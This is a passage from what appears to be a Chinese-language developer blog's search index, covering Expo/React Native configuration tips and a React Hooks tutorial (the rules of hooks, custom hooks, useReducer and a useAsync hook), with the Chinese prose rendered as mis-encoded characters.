åªè¦è¿›å…¥äº†é¡¹ç›®ï¼Œå°±å¯ä»¥éšæ„æ›´æ”¹æ–¹å‘äº†ã€‚\næœ‰å…³å¦‚ä½•æ§åˆ¶åº”ç”¨ç¨‹åºæ–¹å‘çš„ä¿¡æ¯ï¼Œè¯·å‚è§app.jsonä¸­çš„æ–¹å‘é”®\næœ‰æ•ˆå€¼ï¼šè‡ªå“åº”defaultï¼Œçºµå‘portraitï¼Œæ¨ªå‘landscape\nApp.jsonä¸­é…ç½®\n{\r\u0026#34;expo\u0026#34;: {\r\u0026#34;name\u0026#34;: \u0026#34;my-app\u0026#34;,\r\u0026#34;slug\u0026#34;: \u0026#34;my-app\u0026#34;,\r\u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;,\r- \u0026#34;orientation\u0026#34;: \u0026#34;portrait\u0026#34;,//çºµå‘\r+ \u0026#34;orientation\u0026#34;: \u0026#34;default\u0026#34;,//è‡ªå“åº”\r\u0026#34;icon\u0026#34;: \u0026#34;./assets/icon.png\u0026#34;,\r\u0026#34;splash\u0026#34;: {\r\u0026#34;image\u0026#34;: \u0026#34;./assets/splash.png\u0026#34;,\r\u0026#34;resizeMode\u0026#34;: \u0026#34;contain\u0026#34;,\r\u0026#34;backgroundColor\u0026#34;: \u0026#34;#ffffff\u0026#34;\r},\r\u0026#34;updates\u0026#34;: {\r\u0026#34;fallbackToCacheTimeout\u0026#34;: 0\r},\r\u0026#34;assetBundlePatterns\u0026#34;: [\r\u0026#34;**/*\u0026#34;\r],\r\u0026#34;ios\u0026#34;: {\r\u0026#34;supportsTablet\u0026#34;: true\r},\r\u0026#34;android\u0026#34;: {\r\u0026#34;adaptiveIcon\u0026#34;: {\r\u0026#34;foregroundImage\u0026#34;: \u0026#34;./assets/adaptive-icon.png\u0026#34;,\r\u0026#34;backgroundColor\u0026#34;: \u0026#34;#FFFFFF\u0026#34;\r}\r},\r\u0026#34;web\u0026#34;: {\r\u0026#34;favicon\u0026#34;: \u0026#34;./assets/favicon.png\u0026#34;\r}\r}\r} åä¹ã€Expo\u0026amp;UI-Kittenï¼ˆwebç«¯æŠ¥é”™çš„é—®é¢˜ï¼‰ è§£å†³åŠæ³•ï¼š\n//1.å®‰è£…\rexpo install @expo/webpack-config\r//2.æ ¹ç›®å½•æ–°å»º`webpack.config.js`æ·»åŠ \rconst createExpoWebpackConfigAsync = require(\u0026#39;@expo/webpack-config\u0026#39;);\rmodule.exports = async function(env, argv) {\rconst config = await createExpoWebpackConfigAsync({\r...env,\rbabel: {\rdangerouslyAddModulePathsToTranspile: [\u0026#39;@ui-kitten/components\u0026#39;]\r}\r}, argv);\rreturn config;\r}; äºŒåã€Expo Web é¡¹ç›®æŠ½å±‰   è½®æ’­å›¾é€‚åˆç”¨çš„ä¸å¤šï¼Œreact-native-banner-carousel æ˜¯å…¶ä¸­ä¸€ä¸ª\n  react-native-webview ä¸æ”¯æŒwebç«¯æ¸²æŸ“htmlï¼Œæ›¿ä»£æ–¹æ¡ˆæ˜¯ä½¿ç”¨ react-native-web-webview\n  åœ¨çº¿å®¢æœ\n  function Link(props: any) {\rreturn (\r\u0026lt;Text\r{...props}\raccessibilityRole=\u0026#34;link\u0026#34;\rstyle={StyleSheet.compose(styles.link, props.style)}\r/\u0026gt;\r);\r}\r\u0026lt;Link href=\u0026#34;http://wpa.qq.com/msgrd?v=3\u0026amp;uin=QQå·\u0026amp;site=qq\u0026amp;menu=yes\u0026#34; style={styles.item}\u0026gt;\r\u0026lt;TouchableOpacity style={styles.link}\u0026gt;\r\u0026lt;FontAwesome5 name=\u0026#34;comments\u0026#34; size={24} color=\u0026#34;#1296db\u0026#34; /\u0026gt;\r\u0026lt;Text style={styles.item_text}\u0026gt;åœ¨çº¿å®¢æœ\u0026lt;/Text\u0026gt;\r\u0026lt;/TouchableOpacity\u0026gt;\r\u0026lt;/Link\u0026gt;  æ¨¡æ€æ¡†ä½¿ç”¨ react-native-modalize\n  ç”±äºexpo build:web æ„å»ºçš„æ˜¯å•é¡µé¢åº”ç”¨ï¼Œæ‰€ä»¥ï¼Œåœ¨åˆ·æ–°é¡µé¢çš„æ—¶å€™ä¼šæ‰¾ä¸åˆ°è·¯ç”±å¯¹åº”çš„æ–‡ä»¶ï¼Œæ‰€ä»¥ï¼Œæœ€ä¾¿æ·çš„æ–¹å¼æ˜¯é€šè¿‡npx serve \u0026ndash;singleå¯åŠ¨æœåŠ¡ï¼Œé€šè¿‡äº‘æœåŠ¡é…ç½®å¯¹åº”çš„ç«¯å£å·ï¼Œæ¯”å¦‚é…ç½®5000ï¼Œ é‚£ä¹ˆnpx serve \u0026ndash;singleå¯åŠ¨çš„æœåŠ¡ä¹Ÿåº”è¯¥æ˜¯5000ï¼Œ IISé…ç½®çš„ç«¯å£å·éšä¾¿äº†ï¼Œåªè¦ä¸ä¸5000æˆ–è€…å…¶ä»–ç«¯å£å†²çªå°±è¡Œäº†ã€‚\n   é™¤äº†5000ç«¯å£å·ï¼Œè¿˜å¯é€šè¿‡ä»¥ä¸‹å‘½ä»¤è‡ªå®šä¹‰ç«¯å£å·(åŸºäºVercelæœåŠ¡åº“)\n npx serve --single -l 1337\r//or\rnpx serve --single --listen 1337 ","description":"","id":39,"section":"react-native","tags":null,"title":"Expo æœ€ä½³å®è·µ","uri":"https://codthing.github.io/react-native/expo/expo-bp/"},{"content":"Hook æ˜¯ React 16.8 çš„æ–°å¢ç‰¹æ€§ã€‚å®ƒå¯ä»¥è®©ä½ åœ¨ä¸ç¼–å†™ class çš„æƒ…å†µä¸‹ä½¿ç”¨ state ä»¥åŠå…¶ä»–çš„ React ç‰¹æ€§ã€‚\nHook æ˜¯ä¸€äº›å¯ä»¥è®©ä½ åœ¨å‡½æ•°ç»„ä»¶é‡Œâ€œé’©å…¥â€ React state åŠç”Ÿå‘½å‘¨æœŸç­‰ç‰¹æ€§çš„å‡½æ•°ã€‚\nHook ä½¿ä½ åœ¨æ— éœ€ä¿®æ”¹ç»„ä»¶ç»“æ„çš„æƒ…å†µä¸‹å¤ç”¨çŠ¶æ€é€»è¾‘ã€‚ è¿™ä½¿å¾—åœ¨ç»„ä»¶é—´æˆ–ç¤¾åŒºå†…å…±äº« Hook å˜å¾—æ›´ä¾¿æ·ã€‚\nHook å°†ç»„ä»¶ä¸­ç›¸äº’å…³è”çš„éƒ¨åˆ†æ‹†åˆ†æˆæ›´å°çš„å‡½æ•°ï¼ˆæ¯”å¦‚è®¾ç½®è®¢é˜…æˆ–è¯·æ±‚æ•°æ®ï¼‰ï¼Œè€Œå¹¶éå¼ºåˆ¶æŒ‰ç…§ç”Ÿå‘½å‘¨æœŸåˆ’åˆ†ã€‚ä½ è¿˜å¯ä»¥ä½¿ç”¨ reducer æ¥ç®¡ç†ç»„ä»¶çš„å†…éƒ¨çŠ¶æ€ï¼Œä½¿å…¶æ›´åŠ å¯é¢„æµ‹ã€‚\nä»€ä¹ˆæ—¶å€™æˆ‘ä¼šç”¨ Hookï¼Ÿ å¦‚æœä½ åœ¨ç¼–å†™å‡½æ•°ç»„ä»¶å¹¶æ„è¯†åˆ°éœ€è¦å‘å…¶æ·»åŠ ä¸€äº› stateï¼Œä»¥å‰çš„åšæ³•æ˜¯å¿…é¡»å°†å…¶è½¬åŒ–ä¸º classã€‚ç°åœ¨ä½ å¯ä»¥åœ¨ç°æœ‰çš„å‡½æ•°ç»„ä»¶ä¸­ä½¿ç”¨ Hookã€‚\nä¸€ã€Hooks åº•å±‚åŸç† React æ˜¯å¦‚ä½•æŠŠå¯¹ Hook çš„è°ƒç”¨å’Œç»„ä»¶è”ç³»èµ·æ¥çš„ï¼Ÿ\nReact ä¿æŒå¯¹å½“å‰æ¸²æŸ“ä¸­çš„ç»„ä»¶çš„è¿½è¸ªã€‚å¤šäºäº† Hook è§„èŒƒï¼Œæˆ‘ä»¬å¾—çŸ¥ Hook åªä¼šåœ¨ React ç»„ä»¶ä¸­è¢«è°ƒç”¨ï¼ˆæˆ–è‡ªå®šä¹‰ Hook â€”â€” åŒæ ·åªä¼šåœ¨ React ç»„ä»¶ä¸­è¢«è°ƒç”¨ï¼‰ã€‚\næ¯ä¸ªç»„ä»¶å†…éƒ¨éƒ½æœ‰ä¸€ä¸ªã€Œè®°å¿†å•å…ƒæ ¼ã€åˆ—è¡¨ã€‚å®ƒä»¬åªä¸è¿‡æ˜¯æˆ‘ä»¬ç”¨æ¥å­˜å‚¨ä¸€äº›æ•°æ®çš„ JavaScript å¯¹è±¡ã€‚\nå½“ä½ ç”¨ useState() è°ƒç”¨ä¸€ä¸ª Hook çš„æ—¶å€™ï¼Œå®ƒä¼šè¯»å–å½“å‰çš„å•å…ƒæ ¼ï¼ˆæˆ–åœ¨é¦–æ¬¡æ¸²æŸ“æ—¶å°†å…¶åˆå§‹åŒ–ï¼‰ï¼Œç„¶åæŠŠæŒ‡é’ˆç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªã€‚\nè¿™å°±æ˜¯å¤šä¸ª useState() è°ƒç”¨ä¼šå¾—åˆ°å„è‡ªç‹¬ç«‹çš„æœ¬åœ° state çš„åŸå› ã€‚\näºŒã€Hooks è§„èŒƒ 1. åªåœ¨æœ€é¡¶å±‚ä½¿ç”¨ Hook ä¸è¦åœ¨å¾ªç¯ï¼Œæ¡ä»¶æˆ–åµŒå¥—å‡½æ•°ä¸­è°ƒç”¨ Hook ,ç¡®ä¿æ€»æ˜¯åœ¨ä½ çš„ React å‡½æ•°çš„æœ€é¡¶å±‚ä»¥åŠä»»ä½• return ä¹‹å‰è°ƒç”¨ä»–ä»¬ã€‚éµå®ˆè¿™æ¡è§„åˆ™ï¼Œä½ å°±èƒ½ç¡®ä¿ Hook åœ¨æ¯ä¸€æ¬¡æ¸²æŸ“ä¸­éƒ½æŒ‰ç…§åŒæ ·çš„é¡ºåºè¢«è°ƒç”¨ã€‚ ç¤ºä¾‹ï¼š\nfunction Form() {\r// 1. ä½¿ç”¨`name state`å˜é‡\rconst [name, setName] = useState(\u0026#39;Mary\u0026#39;);\r// 2. ä½¿ç”¨ `effect` æ¥æŒä¹…åŒ–è¡¨å•\ruseEffect(function persistForm() {\rlocalStorage.setItem(\u0026#39;formData\u0026#39;, name);\r});\r// 3. ä½¿ç”¨ `surname` çŠ¶æ€å˜é‡\rconst [surname, setSurname] = useState(\u0026#39;Poppins\u0026#39;);\r// 4. ä½¿ç”¨ `effect` æ¥æ›´æ–°æ ‡é¢˜\ruseEffect(function updateTitle() {\rdocument.title = name + \u0026#39; \u0026#39; + surname;\r});\r// ...\r} é‚£ä¹ˆ React æ€ä¹ˆçŸ¥é“å“ªä¸ª state å¯¹åº”å“ªä¸ª useStateï¼Ÿç­”æ¡ˆæ˜¯ React é çš„æ˜¯ Hook è°ƒç”¨çš„é¡ºåºã€‚å› ä¸ºç¤ºä¾‹ä¸­ï¼ŒHook çš„è°ƒç”¨é¡ºåºåœ¨æ¯æ¬¡æ¸²æŸ“ä¸­éƒ½æ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿæ­£å¸¸å·¥ä½œï¼š\n// ------------\r// é¦–æ¬¡æ¸²æŸ“\r// ------------\ruseState(\u0026#39;Mary\u0026#39;) // 1. ä½¿ç”¨ \u0026#39;Mary\u0026#39; åˆå§‹åŒ–å˜é‡åä¸º name çš„ state\ruseEffect(persistForm) // 2. æ·»åŠ  effect ä»¥ä¿å­˜ form æ“ä½œ\ruseState(\u0026#39;Poppins\u0026#39;) // 3. ä½¿ç”¨ \u0026#39;Poppins\u0026#39; åˆå§‹åŒ–å˜é‡åä¸º surname çš„ state\ruseEffect(updateTitle) // 4. æ·»åŠ  effect ä»¥æ›´æ–°æ ‡é¢˜\r// -------------\r// äºŒæ¬¡æ¸²æŸ“\r// -------------\ruseState(\u0026#39;Mary\u0026#39;) // 1. è¯»å–å˜é‡åä¸º name çš„ stateï¼ˆå‚æ•°è¢«å¿½ç•¥ï¼‰\ruseEffect(persistForm) // 2. æ›¿æ¢ä¿å­˜ form çš„ effect\ruseState(\u0026#39;Poppins\u0026#39;) // 3. è¯»å–å˜é‡åä¸º surname çš„ stateï¼ˆå‚æ•°è¢«å¿½ç•¥ï¼‰\ruseEffect(updateTitle) // 4. æ›¿æ¢æ›´æ–°æ ‡é¢˜çš„ effect\r// ... åªè¦ Hook çš„è°ƒç”¨é¡ºåºåœ¨å¤šæ¬¡æ¸²æŸ“ä¹‹é—´ä¿æŒä¸€è‡´ï¼ŒReact å°±èƒ½æ­£ç¡®åœ°å°†å†…éƒ¨ state å’Œå¯¹åº”çš„ Hook è¿›è¡Œå…³è”ã€‚\nå¦‚æœå°†ä¸€ä¸ª Hook è°ƒç”¨æ”¾åˆ°ä¸€ä¸ªæ¡ä»¶è¯­å¥ä¸­ä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿ (ä¾‹å¦‚ persistForm effect)\n// ğŸ”´ åœ¨æ¡ä»¶è¯­å¥ä¸­ä½¿ç”¨ Hook è¿åç¬¬ä¸€æ¡è§„åˆ™\rif (name !== \u0026#39;\u0026#39;) {\ruseEffect(function persistForm() {\rlocalStorage.setItem(\u0026#39;formData\u0026#39;, name);\r});\r} åœ¨ç¬¬ä¸€æ¬¡æ¸²æŸ“ä¸­ name !== \u0026rsquo;\u0026rsquo; è¿™ä¸ªæ¡ä»¶å€¼ä¸º trueï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼šæ‰§è¡Œè¿™ä¸ª Hookã€‚ä½†æ˜¯ä¸‹ä¸€æ¬¡æ¸²æŸ“æ—¶æˆ‘ä»¬å¯èƒ½æ¸…ç©ºäº†è¡¨å•ï¼Œè¡¨è¾¾å¼å€¼å˜ä¸º falseã€‚æ­¤æ—¶çš„æ¸²æŸ“ä¼šè·³è¿‡è¯¥ Hookï¼ŒHook çš„è°ƒç”¨é¡ºåºå‘ç”Ÿäº†æ”¹å˜ï¼š\nuseState(\u0026#39;Mary\u0026#39;) // 1. è¯»å–å˜é‡åä¸º name çš„ stateï¼ˆå‚æ•°è¢«å¿½ç•¥ï¼‰\r// useEffect(persistForm) // ğŸ”´ æ­¤ Hook è¢«å¿½ç•¥ï¼\ruseState(\u0026#39;Poppins\u0026#39;) // ğŸ”´ 2 ï¼ˆä¹‹å‰ä¸º 3ï¼‰ã€‚è¯»å–å˜é‡åä¸º surname çš„ state å¤±è´¥\ruseEffect(updateTitle) // ğŸ”´ 3 ï¼ˆä¹‹å‰ä¸º 4ï¼‰ã€‚æ›¿æ¢æ›´æ–°æ ‡é¢˜çš„ effect å¤±è´¥ React ä¸çŸ¥é“ç¬¬äºŒä¸ª useState çš„ Hook åº”è¯¥è¿”å›ä»€ä¹ˆã€‚React ä¼šä»¥ä¸ºåœ¨è¯¥ç»„ä»¶ä¸­ç¬¬äºŒä¸ª Hook çš„è°ƒç”¨åƒä¸Šæ¬¡çš„æ¸²æŸ“ä¸€æ ·ï¼Œå¯¹åº”çš„æ˜¯ persistForm çš„ effectï¼Œä½†å¹¶éå¦‚æ­¤ã€‚ä»è¿™é‡Œå¼€å§‹ï¼Œåé¢çš„ Hook è°ƒç”¨éƒ½è¢«æå‰æ‰§è¡Œï¼Œå¯¼è‡´ bug çš„äº§ç”Ÿã€‚\nè¿™å°±æ˜¯ä¸ºä»€ä¹ˆ Hook éœ€è¦åœ¨æˆ‘ä»¬ç»„ä»¶çš„æœ€é¡¶å±‚è°ƒç”¨ã€‚å¦‚æœæˆ‘ä»¬æƒ³è¦æœ‰æ¡ä»¶åœ°æ‰§è¡Œä¸€ä¸ª effectï¼Œå¯ä»¥å°†åˆ¤æ–­æ”¾åˆ° Hook çš„å†…éƒ¨ï¼š useEffect(function persistForm() {\r// ğŸ‘ å°†æ¡ä»¶åˆ¤æ–­æ”¾ç½®åœ¨ effect ä¸­\rif (name !== \u0026#39;\u0026#39;) {\rlocalStorage.setItem(\u0026#39;formData\u0026#39;, name);\r}\r}); 2. åªåœ¨ React å‡½æ•°ä¸­è°ƒç”¨ Hook ä¸è¦åœ¨æ™®é€šçš„ JavaScript å‡½æ•°ä¸­è°ƒç”¨ Hookã€‚ä½ å¯ä»¥ï¼š\nâœ… åœ¨ React çš„å‡½æ•°ç»„ä»¶ä¸­è°ƒç”¨ Hook\nâœ… åœ¨è‡ªå®šä¹‰ Hook ä¸­è°ƒç”¨å…¶ä»– Hook (æˆ‘ä»¬å°†ä¼šåœ¨ä¸‹ä¸€é¡µ ä¸­å­¦ä¹ è¿™ä¸ªã€‚)\néµå¾ªæ­¤è§„åˆ™ï¼Œç¡®ä¿ç»„ä»¶çš„çŠ¶æ€é€»è¾‘åœ¨ä»£ç ä¸­æ¸…æ™°å¯è§ã€‚\nä¸‰ã€è‡ªå®šä¹‰ Hook è‡ªå®šä¹‰ Hook æ˜¯ä¸€ç§è‡ªç„¶éµå¾ª Hook è®¾è®¡çš„çº¦å®šï¼Œè€Œå¹¶ä¸æ˜¯ React çš„ç‰¹æ€§ã€‚\nè‡ªå®šä¹‰ Hook æ˜¯ä¸€ç§é‡ç”¨çŠ¶æ€é€»è¾‘çš„æœºåˆ¶(ä¾‹å¦‚è®¾ç½®ä¸ºè®¢é˜…å¹¶å­˜å‚¨å½“å‰å€¼)ï¼Œæ‰€ä»¥æ¯æ¬¡ä½¿ç”¨è‡ªå®šä¹‰ Hook æ—¶ï¼Œå…¶ä¸­çš„æ‰€æœ‰ state å’Œå‰¯ä½œç”¨éƒ½æ˜¯å®Œå…¨éš”ç¦»çš„ã€‚\né€šè¿‡è‡ªå®šä¹‰ Hookï¼Œå¯ä»¥å°†ç»„ä»¶é€»è¾‘æå–åˆ°å¯é‡ç”¨çš„å‡½æ•°ä¸­ã€‚\nè¿™æ˜¯ä¸€ä¸ªèŠå¤©ç¨‹åºä¸­çš„ç»„ä»¶FriendListItem ï¼Œè¯¥ç»„ä»¶ç”¨äºæ˜¾ç¤ºå¥½å‹çš„åœ¨çº¿çŠ¶æ€ï¼š\nimport React, { useState, useEffect } from \u0026#39;react\u0026#39;;\rfunction FriendListItem(props) {\r----------------------------------------------------\rconst [isOnline, setIsOnline] = useState(null);\ruseEffect(() =\u0026gt; {\rfunction handleStatusChange(status) {\rsetIsOnline(status.isOnline);\r}\rChatAPI.subscribeToFriendStatus(props.friend.id, handleStatusChange);\rreturn () =\u0026gt; {\rChatAPI.unsubscribeFromFriendStatus(props.friend.id, handleStatusChange);\r};\r});\r----------------------------------------------------\rreturn (\r\u0026lt;li style={{ color: isOnline ? \u0026#39;green\u0026#39; : \u0026#39;black\u0026#39; }}\u0026gt;\r{props.friend.name}\r\u0026lt;/li\u0026gt;\r);\r} 1. æå–è‡ªå®šä¹‰ Hook å½“æƒ³åœ¨ä¸¤ä¸ªå‡½æ•°ä¹‹é—´å…±äº«é€»è¾‘æ—¶ï¼ŒæŠŠå®ƒæå–åˆ°ç¬¬ä¸‰ä¸ªå‡½æ•°ä¸­ã€‚è€Œç»„ä»¶å’Œ Hook éƒ½æ˜¯å‡½æ•°ï¼Œæ‰€ä»¥ä¹ŸåŒæ ·é€‚ç”¨è¿™ç§æ–¹å¼ã€‚\nè‡ªå®šä¹‰ Hook æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå…¶åç§°ä»¥ use å¼€å¤´ï¼Œå‡½æ•°å†…éƒ¨å¯ä»¥è°ƒç”¨å…¶ä»–çš„ Hookã€‚\nä¾‹å¦‚ï¼Œä¸‹é¢çš„ useFriendStatus æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰çš„ Hook:\nimport { useState, useEffect } from \u0026#39;react\u0026#39;;\rfunction useFriendStatus(friendID) {\rconst [isOnline, setIsOnline] = useState(null);\ruseEffect(() =\u0026gt; {\rfunction handleStatusChange(status) {\rsetIsOnline(status.isOnline);\r}\rChatAPI.subscribeToFriendStatus(friendID, handleStatusChange);\rreturn () =\u0026gt; {\rChatAPI.unsubscribeFromFriendStatus(friendID, handleStatusChange);\r};\r});\rreturn isOnline;\r} æ­¤å¤„å¹¶æœªåŒ…å«ä»»ä½•æ–°çš„å†…å®¹â€”â€”é€»è¾‘æ˜¯ä»ä¸Šè¿°ç»„ä»¶æ‹·è´æ¥çš„ï¼ˆè®°å¾—å»æ‰propsï¼‰ã€‚ä¸ç»„ä»¶ä¸­ä¸€è‡´ï¼Œè¯·ç¡®ä¿åªåœ¨è‡ªå®šä¹‰ Hook çš„é¡¶å±‚æ— æ¡ä»¶åœ°è°ƒç”¨å…¶ä»– Hookã€‚\n2. ä½¿ç”¨è‡ªå®šä¹‰ Hook æŠŠè¿™ä¸ªé€»è¾‘æå–åˆ° FriendListItem çš„è‡ªå®šä¹‰ Hook ä¸­ï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨å®ƒäº†ï¼š\nfunction FriendListItem(props) {\r------------------------------------------\rconst isOnline = useFriendStatus(props.friend.id);\r------------------------------------------\rreturn (\r\u0026lt;li style={{ color: isOnline ? \u0026#39;green\u0026#39; : \u0026#39;black\u0026#39; }}\u0026gt;\r{props.friend.name}\r\u0026lt;/li\u0026gt;\r);\r} 3. åœ¨å¤šä¸ª Hook ä¹‹é—´ä¼ é€’ä¿¡æ¯ ç”±äº Hook æœ¬èº«å°±æ˜¯å‡½æ•°ï¼Œå› æ­¤å¯ä»¥åœ¨å®ƒä»¬ä¹‹é—´ä¼ é€’ä¿¡æ¯ã€‚\nè¿™æ˜¯ä¸€ä¸ªèŠå¤©æ¶ˆæ¯æ¥æ”¶è€…çš„é€‰æ‹©å™¨ï¼Œå®ƒä¼šæ˜¾ç¤ºå½“å‰é€‰å®šçš„å¥½å‹æ˜¯å¦åœ¨çº¿:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  const friendList = [ { id: 1, name: \u0026#39;Phoebe\u0026#39; }, { id: 2, name: \u0026#39;Rachel\u0026#39; }, { id: 3, name: \u0026#39;Ross\u0026#39; }, ]; function ChatRecipientPicker() { --------------------------------------------------------- //å½“å‰é€‰æ‹©çš„å¥½å‹ ID ä¿å­˜åœ¨ recipientID çŠ¶æ€å˜é‡ä¸­ï¼Œå¹¶åœ¨ç”¨æˆ·ä» \u0026lt;select\u0026gt; ä¸­é€‰æ‹©å…¶ä»–å¥½å‹æ—¶æ›´æ–°è¿™ä¸ª stateã€‚  const [recipientID, setRecipientID] = useState(1); //ç”±äº useState ä¸ºæˆ‘ä»¬æä¾›äº† recipientID çŠ¶æ€å˜é‡çš„æœ€æ–°å€¼ï¼Œ //å› æ­¤æˆ‘ä»¬å¯ä»¥å°†å®ƒä½œä¸ºå‚æ•°ä¼ é€’ç»™è‡ªå®šä¹‰çš„ useFriendStatus Hookï¼š  const isRecipientOnline = useFriendStatus(recipientID); --------------------------------------------------------- return ( \u0026lt;\u0026gt; --------------------------------------------------------- //å½“æˆ‘ä»¬é€‰æ‹©ä¸åŒçš„å¥½å‹å¹¶æ›´æ–° recipientID çŠ¶æ€å˜é‡æ—¶ï¼Œ //useFriendStatus Hook å°†ä¼šå–æ¶ˆè®¢é˜…ä¹‹å‰é€‰ä¸­çš„å¥½å‹ï¼Œå¹¶è®¢é˜…æ–°é€‰ä¸­çš„å¥½å‹çŠ¶æ€ã€‚  \u0026lt;Circle color={isRecipientOnline ? \u0026#39;green\u0026#39; : \u0026#39;red\u0026#39;} /\u0026gt; --------------------------------------------------------- \u0026lt;select value={recipientID} onChange={e =\u0026gt; setRecipientID(Number(e.target.value))} \u0026gt; {friendList.map(friend =\u0026gt; ( \u0026lt;option key={friend.id} value={friend.id}\u0026gt; {friend.name} \u0026lt;/option\u0026gt; ))} \u0026lt;/select\u0026gt; \u0026lt;/\u0026gt; ); }   4. è‡ªå®šä¹‰Hooksä¸­ä½¿ç”¨useReducer è‡ªå®šä¹‰ Hook è§£å†³äº†ä»¥å‰åœ¨ React ç»„ä»¶ä¸­æ— æ³•çµæ´»å…±äº«é€»è¾‘çš„é—®é¢˜ã€‚æ›´é‡è¦çš„æ˜¯ï¼Œåˆ›å»ºè‡ªå®šä¹‰ Hook å°±åƒä½¿ç”¨ React å†…ç½®çš„åŠŸèƒ½ä¸€æ ·ç®€å•ã€‚\nå°½é‡é¿å…è¿‡æ—©åœ°å¢åŠ æŠ½è±¡é€»è¾‘ã€‚æ—¢ç„¶å‡½æ•°ç»„ä»¶èƒ½å¤Ÿåšçš„æ›´å¤šï¼Œé‚£ä¹ˆä»£ç åº“ä¸­å‡½æ•°ç»„ä»¶çš„ä»£ç è¡Œæ•°å¯èƒ½ä¼šå‰§å¢ã€‚\nè¿™å±äºæ­£å¸¸ç°è±¡ â€”â€” ä¸å¿…ç«‹å³å°†å®ƒä»¬æ‹†åˆ†ä¸º Hookã€‚ä½†æˆ‘ä»¬ä»é¼“åŠ±ä½ èƒ½é€šè¿‡è‡ªå®šä¹‰ Hook å¯»æ‰¾å¯èƒ½ï¼Œä»¥è¾¾åˆ°ç®€åŒ–ä»£ç é€»è¾‘ï¼Œè§£å†³ç»„ä»¶æ‚ä¹±æ— ç« çš„ç›®çš„ã€‚\nä¾‹å¦‚ï¼Œæœ‰ä¸ªå¤æ‚çš„ç»„ä»¶ï¼Œå…¶ä¸­åŒ…å«äº†å¤§é‡ä»¥ç‰¹æ®Šçš„æ–¹å¼æ¥ç®¡ç†çš„å†…éƒ¨çŠ¶æ€ã€‚useState å¹¶ä¸ä¼šä½¿å¾—é›†ä¸­æ›´æ–°é€»è¾‘å˜å¾—å®¹æ˜“ï¼Œå› æ­¤ä½ å¯èƒ½æ›´æ„¿æ„ä½¿ç”¨ redux ä¸­çš„ reducer æ¥ç¼–å†™ã€‚\né‚£ä¹ˆï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬ä¸ç¼–å†™ä¸€ä¸ª useReducer çš„ Hookï¼Œä½¿ç”¨ reducer çš„æ–¹å¼æ¥ç®¡ç†ç»„ä»¶çš„å†…éƒ¨ state å‘¢ï¼Ÿå…¶ç®€åŒ–ç‰ˆæœ¬å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š\nfunction useReducer(reducer, initialState) {\rconst [state, setState] = useState(initialState);\rfunction dispatch(action) {\rconst nextState = reducer(state, action);\rsetState(nextState);\r}\rreturn [state, dispatch];\r} åœ¨ç»„ä»¶ä¸­ä½¿ç”¨å®ƒï¼Œè®© reducer é©±åŠ¨å®ƒç®¡ç† stateï¼š\nfunction Todos() {\rconst [todos, dispatch] = useReducer(todosReducer, []);\rfunction handleAddClick(text) {\rdispatch({ type: \u0026#39;add\u0026#39;, text });\r}\r// ...\r} 5. å¼‚æ­¥ fetch Hooks å¤„ç†å¼‚æ­¥è°ƒç”¨ï¼Œåº”è¯¥åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š\n åˆ›å»ºä¸€ä¸ªæ¥å—å¤„ç†å‡½æ•°çš„è‡ªå®šä¹‰é’©å­ï¼Œfn. ä¸ºè‡ªå®šä¹‰hooksçš„çŠ¶æ€å®šä¹‰ä¸€ä¸ª reducer å‡½æ•°å’Œä¸€ä¸ªåˆå§‹çŠ¶æ€ã€‚ ä½¿ç”¨useReducer()é’©å­åˆå§‹åŒ–stateå˜é‡å’Œdispatchå‡½æ•°ã€‚ å®šä¹‰ä¸€ä¸ªå¼‚æ­¥ run å‡½æ•°ï¼Œè¯¥å‡½æ•°å°†è¿è¡Œæä¾›çš„å›è°ƒ fnï¼ŒåŒæ—¶æ ¹æ®éœ€è¦ä½¿ç”¨ dispatch æ›´æ–° stateã€‚ è¿”å›ä¸€ä¸ªåŒ…å«state( value,errorå’Œloading) å’Œrunå‡½æ•°çš„å¯¹è±¡ã€‚  1). å°è£… useAsync  ./customHooks/useAsync.ts  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  import React, { useReducer } from \u0026#39;react\u0026#39; export const useAsync = fn =\u0026gt; { //åˆ›å»ºä¸€ä¸ªæ¥å—å¤„ç†å‡½æ•°çš„è‡ªå®šä¹‰é’©å­ï¼Œ`fn`.  const initialState = { loading: false, error: null, value: null }; //åˆå§‹åŒ–çŠ¶æ€  const stateReducer = (_, action) =\u0026gt; {//å¤„ç†çŠ¶æ€çš„é€»è¾‘  switch (action.type) { case \u0026#39;start\u0026#39;: return { loading: true, error: null, value: null }; case \u0026#39;finish\u0026#39;: return { loading: false, error: null, value: action.value }; case \u0026#39;error\u0026#39;: return { loading: false, error: action.error, value: null }; } }; const [state, dispatch] = useReducer(stateReducer, initialState);//ä½¿ç”¨`useReducer()`é’©å­åˆå§‹åŒ–`state`å˜é‡å’Œ`dispatch`å‡½æ•°  const run = async (args = null) =\u0026gt; {//å®šä¹‰ä¸€ä¸ªå¼‚æ­¥ `run` å‡½æ•°ï¼Œè¯¥å‡½æ•°å°†è¿è¡Œæä¾›çš„`å›è°ƒ fn`ï¼ŒåŒæ—¶æ ¹æ®éœ€è¦ä½¿ç”¨ `dispatch` æ›´æ–° `state`  try { dispatch({ type: \u0026#39;start\u0026#39; }); const value = await fn(args); dispatch({ type: \u0026#39;finish\u0026#39;, value }); } catch (error) { dispatch({ type: \u0026#39;error\u0026#39;, error }); } }; return { ...state, run };//è¿”å›ä¸€ä¸ªåŒ…å«`state`( `value`,`error`å’Œ`loading`) å’Œ`run`å‡½æ•°çš„å¯¹è±¡ã€‚ };   2). åœ¨ç»„ä»¶ä¸­ä½¿ç”¨  component  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  import { useAsync } from \u0026#39;./customHooks/useAsync\u0026#39;; const RandomImage = props 